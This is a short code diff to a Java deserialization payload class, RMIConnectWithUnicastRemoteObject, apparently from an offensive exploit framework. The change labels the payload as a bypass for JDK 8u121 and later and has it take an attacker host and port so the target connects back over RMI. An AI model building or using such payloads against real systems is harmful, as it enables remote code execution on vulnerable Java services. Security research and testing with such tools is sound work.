@@ -25,8 +25,8 @@ import java.rmi.server.UnicastRemoteObject;
 @SuppressWarnings({"rawtypes"})
 @Payloads
 @Require(bullets = {"RMIConnectBullet"}, param = false)
-@Dependencies({"return a UnicastRemoteObject object", "not working for rmi"})
-@Authors({ Authors.WH1T3P1G })
+@Dependencies({"using to bypass jdk>=8u121", "return a UnicastRemoteObject object(An Trinh)"})
+@Authors({ Authors.WH1T3P1G , Authors.LALA })
 public class RMIConnectWithUnicastRemoteObject extends Payload<UnicastRemoteObject> {
 
     @Override
@@ -36,7 +36,11 @@ public class RMIConnectWithUnicastRemoteObject extends Payload<UnicastRemoteObje
 
     @Override
     public Bullet getDefaultBullet(String command) throws Exception {
-        return new RMIConnectBullet();
+        Bullet bullet = new RMIConnectBullet();
+        String[] url = command.split(":");
+        bullet.set("rhost", url[0]);
+        bullet.set("rport", url[1]);
+        return bullet;
     }
 
     @Override
